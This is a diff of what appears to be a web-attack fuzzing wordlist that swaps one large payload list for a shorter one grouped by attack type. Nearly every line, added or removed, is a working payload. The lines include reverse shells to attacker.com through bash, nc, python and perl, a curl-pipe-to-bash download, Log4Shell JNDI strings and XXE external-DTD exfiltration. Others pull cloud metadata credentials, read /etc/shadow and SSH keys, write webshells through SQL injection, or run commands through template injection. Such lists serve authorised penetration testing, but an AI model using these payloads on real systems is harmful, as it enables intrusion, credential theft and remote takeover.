@@ -1,916 +1,220 @@
-''
-' || 1==1%00
-' || 1==1//
+
+//*
+${${env:ENV_NAME}}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+${{7*7}}
+${7*7}
+$(id)
+${jndi:dns://attacker.com/a}
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+$(whoami)
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3Cscript%3Ealert(1)%3C/script%3E
+-5+2+cmd|' /C calc'!A0
+#{7*7}
+*{7*7}
+<%- 7*7 %>
+<%= 7*7 %>
+@{{7*7}}
+[[7*7]]
+{{7*7}}
+admin' #
+admin'--
+admin'/*
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
+<a href="javascript:alert(1)">Click Me</a>
+' AND 1=2 UNION SELECT 1,2,3,4,5--
 ' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
 ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
-' AND (SELECT 20 FROM (SELECT(SLEEP(5)))a)--
-' AND 1=0 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-' AND 1=0 UNION SELECT table_name,NULL FROM information_schema.tables--
-' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
-' and extractvalue(1,concat(0x7e,(select version())))--
-' and if(substring(user(),1,1)='r',sleep(5),0)--
-' and row(1,1)>(select count(*),concat((select version()),0x3a,floor(rand()*2))x from information_schema.tables group by x)--
-' and updatexml(1,concat(0x7e,(select version())),1)--
-' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
-' or ''='
-' OR 1=1--
+<audio src=x onerror=alert(1)>
+/.bash_history
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+body { background: url("javascript:alert(1)"); }
+<body onload=alert(1)>
+; cat /etc/passwd
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{config}}
+/config.php
+count(/child::node())
+count(//*[position()=1])
+; curl http://attacker.com/shell.sh | bash
+C:\windows\system32\drivers\etc\hosts
+C:\windows\win.ini
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
++DDE("cmd";"/C calc";"__DDE__")
+<details open ontoggle=alert(1)>
+dict://127.0.0.1:6379/
+'); DROP TABLE users;--
+<!--#echo var="DATE_LOCAL" -->
+<embed src="javascript:alert(1)">
+/.env
+/etc/crontab
+/etc/group
+/etc/hosts
+/etc/issue
+../../../../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../etc/passwd
+/etc/passwd
+/etc/shadow
+eval("echo 123");
+<!--#exec cmd="ls" -->
+<!--#exec cmd="whoami" -->
+'; EXEC xp_cmdshell('whoami');--
+expect://id
+file:///c:/windows/win.ini
+file:///etc/hosts
+file:///etc/passwd
+file:///proc/self/environ
+FIND {admin*}
+<form><button formaction="javascript:alert(1)">Click Me</button></form>
+/.git/config
+gopher://127.0.0.1:6379/_SET%20test%201
+http://0.0.0.0:80
+http://0177.0.0.1:80
+http://0:80
+http://10.0.0.1
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:443
+http://127.0.0.1:6379
+http://127.0.0.1:80
+http://127.1:80
+http://127.666.1:80
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254.nicelocal.com/
+http://[::]:80
+http://instance-data/latest/meta-data/
+http://localhost:443
+http://localhost:80
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://spoofed.169.254.169.254.xip.io/
+& id
+; id
+`id`
+| id
+?id[]=1
+<iframe src="javascript:alert(1)"></iframe>
+<img src="javascript:alert(1)">
+<img src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+{% import "os" %}{{ os.popen("whoami").read() }}
+__import__('os').system('ls')
+<!--#include virtual="/etc/passwd" -->
+# --- INJECTION VARIANTS (CSV, XPath, SSI, Code, Log) ---
+<input onfocus=alert(1) autofocus>
+input[value^="a"] { background-image: url('https://attacker.com/exfil?char=a'); }
+<isindex type=image src=1 onerror=alert(1)>
+javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+# --- LFI & PATH TRAVERSAL ---
+; ls -la
+<marquee onstart=alert(1)>
+<math><mtext><option><annotation><legend><path><svg><rect><foreignObject><p><table><script>alert(1)</script>
+{__name__=~".+"}
+; nc -e /bin/sh attacker.com 4444
+<object data="javascript:alert(1)">
+" OR "1"="1
+" OR 1=1#
 ' OR '1'='1
+' OR '1'='1' /*
 ' OR '1'='1'--
+' OR 1=1#
+' OR 1=1--
+' OR 1=1-- 
+' OR 1=1--+-
+' OR 1=1/*
+' OR 1=1 %00
+' OR 1=1 %23
+' OR 1=1 %2D%2D
 ' OR 1=1 GROUP BY 1--
-' or 1=1 into outfile '/tmp/test.txt'--
+' OR 1=1 HAVING 1=1--
+' OR 1=1 INTO DUMPFILE '/tmp/exploit'--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
 ' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 1--
+' or 1=1 or ''='
+' or '1'='1' or ''='
 ' OR 1=1 ORDER BY 1--
-' or 1=1#
-' or 1=1/*
-' OR '1'='1'/*
-' OR 'a'='a
+' OR 2+2=4--
+' OR 3*3=9--
 ' OR 'a'='a'--
-' OR 'a'='a'/*
-' OR BENCHMARK(1000000,MD5(1))--
+' OR Name LIKE '%'
+' OR SLEEP(10)--
+" OR SLEEP(5)--
 ' OR SLEEP(5)--
-' or 'x'='x
-' UNION SELECT @@version,NULL,NULL--
-' UNION SELECT database(),NULL,NULL--
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+phpinfo();
+/proc/self/cmdline
+/proc/self/environ
+/proc/version
+; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+# --- RCE & CMD INJECTION ---
+{{request.application.__self__._mw_app.settings}}
+\r\nBcc: victim@domain.com
+\r\nContent-Type: text/html\r\n\r\n<h1>Hacked</h1>
+\r\nSubject: Spoofed
+#{root}
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
+(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
+{{self.__dict__}}
+{{ self.template.module.os.popen('whoami').read() }}
+{{settings}}
+& sleep 5
+; sleep 5
+| sleep 5
+# --- SQL INJECTION ---
+/.ssh/id_rsa
+# --- SSRF & CLOUD ---
+# --- SSTI ---
+=SUM(1+1)*cmd|' /C calc'!A0
+@SUM(1+2)
+<svg/onload=alert(1)>
+<svg/onload=confirm(1)>
+<svg><script>alert(1)</script></svg>
+; uname -a
+| uname -a
+' UNION SELECT 1,2,3--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT database(),NULL--
+' UNION SELECT load_file('/etc/passwd'),NULL--
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT user(),NULL,NULL--
-" or "1"="1
-" or "1"="1"--
-" OR 1=1--
-" OR SLEEP(5)--
-""
-") OR "1"="1
-") or ("1"="1
-'"><script>alert(1)</script>
-#{"freemarker.template.utility.Execute"?new()("id")}
-#{7*7}
-$(cat /etc/passwd)
-$(id)
-$(whoami)
-${"f".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id").getInputStream()}
-${"freemarker.template.utility.Execute"?new()("id")}
-${7*7}
-${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
-%0a id
-%0a whoami
-%0aheader:injected
-%0aid
-%0aSet-Cookie%3a%20foo%3dbar
-%0awhoami
-%0d%0a%0d%0a<script>alert(1)</script>
-%0d%0aAccess-Control-Allow-Origin:*
-%0d%0acontent-length:0%0d%0a%0d%0a<script>alert(1)</script>
-%0d%0acontent-type:text/html
-%0d%0aheader:injected
-%0d%0aHeader:Value
-%0d%0aHTTP/1.1 200 OK%0d%0acontent-type:text/html%0d%0a%0d%0a<script>alert(1)</script>
-%0d%0aid
-%0d%0alocation:http://evil.com
-%0d%0aSet-Cookie%3a%20foo%3dbar
-%0d%0aset-cookie:malicious=true
-%0d%0aSet-Cookie:session=hacked
-%0d%0awhoami
-%0d%0aX-XSS-Protection:0
-%0dheader:injected
-%23%0aSet-Cookie%3a%20foo%3dbar
-%24(id)
-%2527%2527
-%2527+oR+%25271%2527%253d%25271%2527--
-%252e%252e%252f
-%253cscript%253ealert%25281%2529%253c%252fscript%253e
-%26%26id
-%27 or 1=1--
-%27%20or%201%3d1--
-%27%27
-%27+oR+%271%27%3d%271%27--
-%2e%2e%2f
-%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
-%2e%2e/%2e%2e/%2e%2e/etc/passwd
-%2f%2fevil.com
-%3b%0aSet-Cookie%3a%20foo%3dbar
-%3bwhoami
-%3cscript%3ealert%281%29%3c%2fscript%3e
-%3cscript%3ealert(1)%3c/script%3e
-%5c%5cevil.com
-%5c..%5c..%5c..%5cwindows%5cwin.ini
-%60id%60
-%68%74%74%70%3a%2f%2fevil.com
-%7b%22__proto__%22%3a%7b%22admin%22%3atrue%7d%7d
-%7cid
-%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
-%c4%8d%c4%8aheader:injected
-%c4%8dheader:injected
-%E5%98%8D%E5%98%8Aheader:injected
-%E5%98%8D%E5%98%8Aset-cookie:injected
-%u000d%u000aheader:injected
-%u003cscript%u003ealert(1)%u003c/script%u003e
-& cat /etc/passwd;
-& cmd /c dir
-& curl http://attacker.com/`whoami`;
-& id;
-& ping -c 3 attacker.com;
-& powershell -command whoami
-& uname -a;
-& whoami;
-&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
-&#60;script&#62;alert(1)&#60;/script&#62;
-&#x2e;&#x2e;&#x2f;
-&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
-&&id
-&&whoami
-&lt;script&gt;alert(1)&lt;/script&gt;
-(lp0\nS'id'\nap1\ntp2\nRp3\n.
-') or ('1'='1--
-') OR '1'='1
-') or '1'='1--
-)(cn=*
-)(mail=*
-)(objectClass=*)
-)(uid=*))(|(uid=*
-)(uid=admin
-')) OR (('1'='1
-*
-*()|%26'
-*(|(objectClass=*
-*(|(uid=*
-*(|(uid=admin
-*(|(userPassword=*
-*(objectClass=*)
-*)(!(uid=admin
-*)(&(objectClass=*))
-*)(&(password=*))
-*)(&(uid=admin))
-*)(&(userPassword=*))
-*)((|
-*)(|(cn=*
-*)(|(objectClass=*)
-*)(cn=*)
-*)(mail=*)
-*)(objectClass=*
-*)(uid=*
-*))%00
-*\00
-*{7*7}
-*admin
-..%252f..%252f..%252fetc%252fpasswd
-..%2f..%2f..%2fetc%2fpasswd
-..%5c..%5c..%5cwindows%5cwin.ini
-..%c0%afetc%c0%afpasswd
-..%c1%9cetc%c1%9cpasswd
-..%ef%bc%8fetc%ef%bc%8fpasswd
-....//....//....//etc/passwd
-..././..././..././etc/passwd
-../../../../../../../../../../../../../../etc/hosts
-../../../../../../../../../../../../../../etc/passwd
-../../../../../../../../../../../../../../etc/shadow
-../../../../../../../../../../../../../../proc/self/environ
-../../../../../../../../../../etc/passwd
-../../../../../../../../../etc/passwd
-../../../../../../../../etc/passwd
-../../../../../../../etc/passwd
-../../../../../../etc/passwd
-../../../../../etc/passwd
-../../../../etc/passwd
-../../../etc/passwd
-../../../etc/passwd%00
-../../etc/passwd
-../../etc/passwd%00
-../../etc/passwd%00.jpg
-../../etc/passwd%2500
-..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
-..\..\..\..\windows\win.ini
-..\..\..\windows\win.ini
-/ /evil.com
-/%09/evil.com
-/%09/google.com
-/%0a/evil.com
-/%0d/evil.com
-/%2f%2fevil.com
-/%5cgoogle.com
-/.well-known/
-////evil.com
-///evil.com
-//[evil.com]
-//0xd83ddc4d@evil.com
-//attacker.com
-//evil%2ecom
-//evil%E3%80%82com
-//evil.com
-//evil.com#http://legit.com
-//evil.com%2f%2f..
-//evil.com/
-//evil.com/%2f..
-//evil.com?x=http://legit.com
-//evil.com@legit.com
-//google.com
-//legit.com.evil.com
-/?author=1
-/?author=2
-/?feed=atom
-/?feed=rss2
-/?p=1&preview=true
-/\/evil.com
-/\evil.com
-/\google.com
-/author/admin/
-/etc/hostname
-/etc/hosts
-/etc/passwd
-/etc/passwd%00
-/etc/resolv.conf
-/etc/shadow
-/feed/
-/home/user/.bash_history
-/home/user/.ssh/id_rsa
-/http://evil.com
-/http://google.com
-/https://google.com
-/license.txt
-/page%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:21%0d%0a%0d%0a<html>injected</html>
-/proc/cpuinfo
-/proc/self/cmdline
-/proc/self/environ
-/proc/self/fd/0
-/proc/self/fd/1
-/proc/self/fd/2
-/proc/self/fd/3
-/proc/self/net/fib_trie
-/proc/version
-/readme.html
-/readme.txt
-/root/.bash_history
-/root/.ssh/id_rsa
-/sys/class/net/eth0/address
-/var/log/apache/access.log
+' UNION SELECT schema(),NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT user(),NULL--
+' UNION SELECT @@version,NULL--
+up{job=".*"}
 /var/log/apache2/access.log
 /var/log/auth.log
 /var/log/httpd/access.log
 /var/log/nginx/access.log
 /var/log/syslog
-/var/mail/root
-/var/www/.env
-/var/www/html/.env
-/var/www/html/config.php
-/var/www/html/wp-config.php
-/wp-activate.php
-/wp-admin/
-/wp-admin/admin-ajax.php
-/wp-admin/install.php
-/wp-admin/options-general.php
-/wp-admin/plugin-editor.php
-/wp-admin/plugin-install.php
-/wp-admin/setup-config.php
-/wp-admin/theme-editor.php
-/wp-admin/upgrade.php
-/wp-admin/user-new.php
-/wp-admin/users.php
-/wp-comments-post.php
-/wp-config.php
-/wp-config.php.bak
-/wp-config.php~
-/wp-config-sample.php
-/wp-content/
-/wp-content/backup-db/
-/wp-content/debug.log
-/wp-content/plugins/
-/wp-content/themes/
-/wp-content/uploads/
-/wp-content/uploads/backups/
-/wp-cron.php
-/wp-includes/
-/wp-includes/theme-compat/
-/wp-includes/version.php
-/wp-includes/wlwmanifest.xml
-/wp-json/
-/wp-json/oembed/1.0/embed?url=
-/wp-json/wp/v2/pages
-/wp-json/wp/v2/posts
-/wp-json/wp/v2/settings
-/wp-json/wp/v2/users
-/wp-json/wp/v2/users/1
-/wp-login.php
-/wp-mail.php
-/wp-signup.php
-/wp-trackback.php
-/xmlrpc.php
-; bash -i >& /dev/tcp/attacker.com/4444 0>&1
-; cat /etc/passwd;
-; cmd /c dir c:\
-; cmd /c ipconfig
-; cmd /c net user
-; cmd /c systeminfo
-; cmd /c type c:\windows\win.ini
-; curl http://attacker.com/$(id)
-; curl http://attacker.com/`whoami`;
-'; drop table users--
-'; exec master..xp_cmdshell('whoami')--
-'; exec xp_cmdshell('whoami')--
-; id;
-; nc -e /bin/bash attacker.com 4444
-; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-; ping -c 1 attacker.com
-; ping -c 3 attacker.com;
-; powershell -command whoami
-; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-; uname -a;
-; wget http://attacker.com/?q=$(id)
-; whoami;
-;;
-;cat /etc/passwd
-;cmd /c whoami
-;echo ${PATH}
-;echo $HOME
-;echo $USER
-;env
-;id
-;ifconfig
-;ip a
-;ls -la
-;netstat -an
-;printenv
-;ps aux
-;pwd
-;set
-;uname -a
-;whoami
-?__proto__[admin]=true
-?__proto__[isAdmin]=true
-?__proto__[polluted]=yes
-?constructor[prototype][admin]=true
-?constructor[prototype][isAdmin]=true
-@(1+1)
-@{1+1}
-[{"__proto__":{"admin":true}}]
-\' or 1=1--
-\/evil.com
-\\evil.com
-\28
-\29
-\2a
-\5c
-\evil.com
-\j\a\v\a\s\c\r\i\p\t\:alert(1)
-\n\rid
-\nheader:injected
-\nid
-\nwhoami
-\r\nheader:injected
-\r\nLocation:http://evil.com
-\r\nSet-Cookie:admin=true
-\r\nSet-Cookie:session=hacked
-\u000d\u000aheader:injected
-\u002e\u002e\u002f
-\u003cscript\u003ealert(1)\u003c/script\u003e
-\x3cscript\x3ealert(1)\x3c/script\x3e
-\x80\x02}q\x00(X\x04\x00\x00\x00userq\x01X\x05\x00\x00\x00adminq\x02u.
-__proto__[admin]=true
-__proto__[isAdmin]=true
-__proto__[test]=test
-``
-`id`
-`whoami`
-{"$gt": ""}
-{"$ne": null}
-{"$regex": ".*"}
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd.exe","Arguments":"/c whoami"}}}
-{"$type":"TypeConfuseDelegate","target":{"$type":"System.Diagnostics.Process","StartInfo":{"FileName":"cmd.exe","Arguments":"/c whoami"}}}
-{"$where": "1==1"}
-{"$where": "function() { return true; }"}
-{"$where": "sleep(5000)"}
-{"$where": "this.a == 1 && sleep(1000)"}
-{"$where": "this.username == 'admin'"}
-{"@class":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:..."}
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/exploit","autoCommit":true}
-{"@type":"java.lang.Runtime","exec":["id"]}
-{"__class":"Exception","message":"test"}
-{"__class":"Symfony\\Component\\Routing\\Exception\\InvalidParameterException","message":"test"}
-{"__proto__":{"admin":true}}
-{"__proto__":{"allowedRoles":["admin"]}}
-{"__proto__":{"content-type":"application/json"}}
-{"__proto__":{"debug":true}}
-{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/fd/0"}}}
-{"__proto__":{"hasOwnProperty":"1"}}
-{"__proto__":{"isAdmin":true}}
-{"__proto__":{"isAuthenticated":true}}
-{"__proto__":{"main":"/proc/self/fd/0"}}
-{"__proto__":{"polluted":"yes"}}
-{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=attacker.com:4444"}}
-{"__proto__":{"test":"test"}}
-{"__proto__":{"toString":"1"}}
-{"__proto__":{"type":"nodejs","cwd":"/tmp","args":["--inspect=attacker.com"]}}
-{"__proto__":{"valueOf":"1"}}
-{"__proto__":{"x-forwarded-for":"127.0.0.1"}}
-{"_class":"__PHP_Incomplete_Class","__PHP_Incomplete_Class_Name":"FooBar"}
-{"a": {"$gt": ""}, "b": {"$gt": ""}}
-{"a":{"__proto__":{"admin":true}}}
-{"alg":"HS256","kid":"' union select 'secret'--"}
-{"alg":"HS256","kid":"../../dev/null"}
-{"alg":"HS256","kid":"/dev/null"}
-{"alg":"HS256","kid":"key|id; drop table keys;--"}
-{"alg":"none","typ":"JWT"}
-{"alg":"NONE"}
-{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
-{"alg":"RS256","jwk":{"kty":"RSA","kid":"attacker","n":"...","e":"AQAB"}}
-{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
-{"constructor":{"prototype":{"admin":true}}}
-{"constructor":{"prototype":{"polluted":"yes"}}}
-{"data":{"__proto__":{"admin":true}}}
-{"q": {"$gt": ""}}
-{"selector": {"$gt": ""}}
-{"selector": {"$ne": null}}
-{"user": {"$nin": []}}
-{"user": {"$not": {"$size": 0}}}
-{"username": "admin", "password": {"$gt": ""}}
-{"username": "admin", "password": {"$ne": "invalid"}}
-{"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}
-{"username": {"$eq": "admin"}, "password": {"$regex": "^ad"}}
-{"username": {"$exists": true}, "password": {"$exists": true}}
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$in": ["admin","root","user"]}, "password": {"$gt": ""}}
-{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
-{"username": {"$ne": null}, "password": {"$ne": null}}
-{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
-{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
-{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
-{__schema{types{name fields{name}}}}
-{__schema{types{name,fields{name,args{name}}}}}
-{__schema{types{name}}}
-{__type(name:"Mutation"){fields{name}}}
-{__type(name:"Query"){fields{name}}}
-{__type(name:"User"){fields{name type{name kind ofType{name kind}}}}}
-{{ ''.__class__.__mro__[2].__subclasses__()[40].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()") }}
-{{ [].class.parent.subclasses().find { it.name == 'groovy.util.Eval' }?.invokeMethod('me', 'id') }}
-{{ get_flashed_messages.__globals__['current_app'].config }}
-{{ self.__dict__ }}
-{{ self._TemplateReference__context.namespace.clear() }}
-{{''.__class__.__bases__[0].__subclasses__()}}
-{{''.__class__.__mro__[1].__subclasses__()}}
-{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
-{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].popen('id').read()}}
-{{''.__class__.__mro__[2].__subclasses__()}}
-{{7*7}}
-{{7*'7'}}
-{{7*7}}${7*7}<%=7*7%>
-{{7*7}}{{7*'7'}}${7*7}
-{{config.items()}}
-{{config}}
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-{{joiner.__init__.__globals__.os.popen('id').read()}}
-{{lipsum.__globals__['os'].popen('id').read()}}
-{{namespace.__init__.__globals__.os.popen('id').read()}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{request.application.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
-{{request.environ}}
-{{request}}
-{{self.__dict__}}
-{{self}}
-{{settings}}
-{cat,/etc/passwd}
-{products{... on Product{secretField}}}
-{secret @skip(if:false){value}}
-{user(id:"' or '1'='1"){id email}}
-{user(id:"1 or 1=1"){id email}}
-{user{id},__typename}
-{users{id email password role}}
-| cat /etc/passwd;
-| curl http://attacker.com/`whoami`;
-| id;
-| ping -c 3 attacker.com;
-| powershell -command whoami
-| uname -a;
-| whoami;
-'||'1'=='1
-||id
-||whoami
-|cmd /c whoami
-|id
-|whoami
-<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>
-<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
-<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]> <r>&xxe;</r>
-<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
-<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]> <r>&xxe;</r>
-<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]> <r>&xxe;</r>
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-<% require 'open3'; @a,@b,@c=Open3.capture3("id") %>
-<%= 7*7 %>
-<%= system("id") %>
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
-<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY % a SYSTEM "http://attacker.com/evil.dtd">%a;]><data>&b;</data>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>&exfil;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com:2121/x">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_info">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo>&xxe;</foo>
-<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">%init;]><foo/>
-<<script>alert(1)//<</script>
-<a href="javascript:alert(1)">Click Me</a>
-<a href="javascript:alert(document.cookie)">click</a>
-<a href=javascript:alert(1)>click</a>
-<a href=javascript:void(0) onclick=alert(1)>click</a>
-<audio src=x onerror=alert(1)>
-<b onmouseover=alert(1)>Hover Me</b>
-<body onload=alert(1)>
-<body onpageshow=alert(1)>
-<details open ontoggle=alert(1)>
-<div oncontextmenu=alert(1)>Right Click</div>
-<div style="background:url(javascript:alert(1))"></div>
-<embed src="javascript:alert(1)">
-<embed src=javascript:alert(1)>
-<form><button formaction="javascript:alert(1)">Click
-<form><button formaction=javascript:alert(1)>click</button></form>
-<h1 ondblclick=alert(1)>Double Click</h1>
-<i onmousedown=alert(1)>Click Me</i>
-<iframe onload=alert(1) src=about:blank>
-<iframe src="javascript:alert(1)">
-<iframe src=javascript:alert(1)>
-<img src="x`onerror`=alert(1)">
-<img src=x &#111;nerror=alert(1)>
-<img src=x onerror&#61;alert(1)>
-<img src=x onerror&#x3D;alert(1)>
-<img src=x onerror=alert(1)>
-<img src=x onerror=alert(document.cookie)>
-<img src=x onerror=alert('xss')>
-<input autofocus onfocus=alert(1)>
-<input onblur=alert(1) autofocus>
-<input onfocus=alert(1) autofocus>
-<input oninvalid=alert(1) required autofocus>
-<input onpaste=alert(1) value="Paste Me">
-<input onsearch=alert(1)>
-<isindex action=javascript:alert(1) type=image>
-<isindex formaction="javascript:alert(1)" type=submit>
-<keygen onfocus=alert(1) autofocus>
-<link rel=stylesheet href=javascript:alert(1)>
-<marquee onstart=alert(1)>
-<marquee onstart=alert(1)>xss</marquee>
-<math><a xlink:href=javascript:alert(1)>click</a></math>
-<math><x href="javascript:alert(1)">click
-<object data="javascript:alert(1)">
-<object data=javascript:alert(1)>
-<p onclick=alert(1)>Click Me</p>
-<scr<script>ipt>alert(1)</scr</script>ipt>
-<script src=//evil.com/xss.js></script>
-<script>alert(1)</script
-<script>alert(1)</script>
-<script>alert(document.cookie)</script>
-<script>alert('XSS')</script>
-<script>document.write('<img src=x onerror=alert(1)>')</script>
-<script>eval(atob('YWxlcnQoMSk='))</script>
-<script>setInterval('alert(1)',1000)</script>
-<script>setTimeout('alert(1)',0)</script>
